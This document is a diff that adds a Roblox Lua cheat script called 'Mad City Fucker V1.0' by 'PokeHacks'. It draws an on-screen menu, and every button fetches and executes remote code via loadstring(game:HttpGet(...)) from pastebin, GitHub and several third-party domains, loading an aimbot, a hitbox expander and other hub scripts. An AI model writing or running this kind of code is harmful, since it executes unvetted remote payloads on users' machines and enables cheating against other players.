@@ -1,0 +1,199 @@
+--Made By PokeHacks--
+--All Of The Script Where Form rbxscript.com--
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local CloseMenu = Instance.new("TextButton")
+local Script1 = Instance.new("TextBox")
+local Script2 = Instance.new("TextBox")
+local Script3 = Instance.new("TextBox")
+local Script4 = Instance.new("TextBox")
+local Script4_2 = Instance.new("TextBox")
+local Script5 = Instance.new("TextBox")
+local Script5_2 = Instance.new("TextBox")
+local Script6 = Instance.new("TextBox")
+local MainText = Instance.new("TextLabel")
+local PokeHacks = Instance.new("TextLabel")
+local OpenMain = Instance.new("Frame")
+local Open = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+Main.Name = "Main"
+Main.Parent = ScreenGui
+Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Main.Position = UDim2.new(0.649652123, 0, 0.715719044, 0)
+Main.Size = UDim2.new(0, 331, 0, 153)
+Main.Visible = false
+Main.Active = true
+Main.Draggable = true
+
+CloseMenu.Name = "Close Menu"
+CloseMenu.Parent = Main
+CloseMenu.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+CloseMenu.BorderColor3 = Color3.fromRGB(27, 42, 53)
+CloseMenu.Position = UDim2.new(0.415454686, 0, 0.284057319, 0)
+CloseMenu.Size = UDim2.new(0, 57, 0, 27)
+CloseMenu.Font = Enum.Font.Code
+CloseMenu.Text = "Close"
+CloseMenu.TextColor3 = Color3.fromRGB(0, 0, 0)
+CloseMenu.TextSize = 14.000
+CloseMenu.MouseButton1Down:connect(function()
+Main.Visible = false
+OpenMain.Visible = true
+end)
+
+Script1.Name = "Script-1"
+Script1.Parent = Main
+Script1.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script1.Position = UDim2.new(0.0274819676, 0, 0.72992897, 0)
+Script1.Size = UDim2.new(0, 96, 0, 29)
+Script1.Font = Enum.Font.Code
+Script1.Text = "First Gui"
+Script1.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script1.TextSize = 14.000
+Script1.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/YB4hsG56'))()
+end)
+
+Script2.Name = "Script-2"
+Script2.Parent = Main
+Script2.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script2.Position = UDim2.new(0.0268042628, 0, 0.516153872, 0)
+Script2.Size = UDim2.new(0, 96, 0, 29)
+Script2.Font = Enum.Font.Code
+Script2.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
+Script2.Text = "Second Gui"
+Script2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script2.TextSize = 14.000
+Script2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/8Q7y93US", true))()
+end)
+
+Script3.Name = "Script-3"
+Script3.Parent = Main
+Script3.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script3.Position = UDim2.new(0.360074699, 0, 0.519606113, 0)
+Script3.Size = UDim2.new(0, 96, 0, 29)
+Script3.Font = Enum.Font.Code
+Script3.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
+Script3.Text = "AimBot"
+Script3.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script3.TextSize = 14.000
+Script3.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ZinityDrops/OwlHubLink/master/OwlHubBack.lua"))();
+end)
+
+Script4.Name = "Script-4"
+Script4.Parent = Main
+Script4.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script4.Position = UDim2.new(0.683071136, 0, 0.72992897, 0)
+Script4.Size = UDim2.new(0, 96, 0, 29)
+Script4.Font = Enum.Font.Code
+Script4.Text = "Sixth Gui"
+Script4.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script4.TextSize = 14.000
+Script4.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
+end)
+
+Script4_2.Name = "Script-4"
+Script4_2.Parent = Main
+Script4_2.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script4_2.Position = UDim2.new(0.0268042628, 0, 0.291434765, 0)
+Script4_2.Size = UDim2.new(0, 96, 0, 29)
+Script4_2.Font = Enum.Font.Code
+Script4_2.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
+Script4_2.Text = "Third Gui"
+Script4_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script4_2.TextSize = 14.000
+Script4_2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
+end)
+
+Script5.Name = "Script-5"
+Script5.Parent = Main
+Script5.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script5.Position = UDim2.new(0.359219611, 0, 0.729049325, 0)
+Script5.Size = UDim2.new(0, 96, 0, 29)
+Script5.Font = Enum.Font.Cartoon
+Script5.Text = "HitBox"
+Script5.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script5.TextSize = 14.000
+Script5.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("http://gameovers.net/Scripts/Free/HitboxExpander/main.lua", true))()
+end)
+
+Script5_2.Name = "Script-5"
+Script5_2.Parent = Main
+Script5_2.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script5_2.Position = UDim2.new(0.680316389, 0, 0.28926903, 0)
+Script5_2.Size = UDim2.new(0, 96, 0, 29)
+Script5_2.Font = Enum.Font.Code
+Script5_2.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
+Script5_2.Text = "Forth Gui"
+Script5_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script5_2.TextSize = 14.000
+Script5_2.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://jack1214060.xyz/jayhub",true))()
+end)
+
+Script6.Name = "Script-6"
+Script6.Parent = Main
+Script6.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
+Script6.Position = UDim2.new(0.682482421, 0, 0.51556617, 0)
+Script6.Size = UDim2.new(0, 96, 0, 29)
+Script6.Font = Enum.Font.Cartoon
+Script6.Text = "Fifth Gui"
+Script6.TextColor3 = Color3.fromRGB(0, 0, 0)
+Script6.TextSize = 14.000
+Script6.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://system-exodus.com/scripts/madlads/MadLads.lua",true))()
+end)
+
+MainText.Name = "Main Text"
+MainText.Parent = Main
+MainText.BackgroundColor3 = Color3.fromRGB(95, 0, 71)
+MainText.Position = UDim2.new(0, 0, -0.00512926746, 0)
+MainText.Size = UDim2.new(0, 331, 0, 28)
+MainText.SizeConstraint = Enum.SizeConstraint.RelativeXX
+MainText.Font = Enum.Font.Creepster
+MainText.Text = "Mad City Fucker  V1.0"
+MainText.TextColor3 = Color3.fromRGB(0, 0, 0)
+MainText.TextSize = 18.000
+
+PokeHacks.Name = "PokeHacks"
+PokeHacks.Parent = Main
+PokeHacks.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PokeHacks.BackgroundTransparency = 1.000
+PokeHacks.Position = UDim2.new(0.709969759, 0, 0.0130718965, 0)
+PokeHacks.Size = UDim2.new(0, 96, 0, 21)
+PokeHacks.Font = Enum.Font.Code
+PokeHacks.Text = "Made By PokeHacks"
+PokeHacks.TextColor3 = Color3.fromRGB(0, 0, 0)
+PokeHacks.TextSize = 10.000
+
+OpenMain.Name = "OpenMain"
+OpenMain.Parent = ScreenGui
+OpenMain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OpenMain.Position = UDim2.new(0.0102685625, 0, 0.939799309, 0)
+OpenMain.Size = UDim2.new(0, 88, 0, 26)
+OpenMain.Active = true
+OpenMain.Draggable = true
+
+Open.Name = "Open"
+Open.Parent = OpenMain
+Open.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+Open.Size = UDim2.new(0, 88, 0, 26)
+Open.Font = Enum.Font.Code
+Open.Text = "Open Ui"
+Open.TextColor3 = Color3.fromRGB(0, 0, 0)
+Open.TextSize = 14.000
+Open.MouseButton1Down:connect(function()
+OpenMain.Visible = false
+Main.Visible = true
+end)
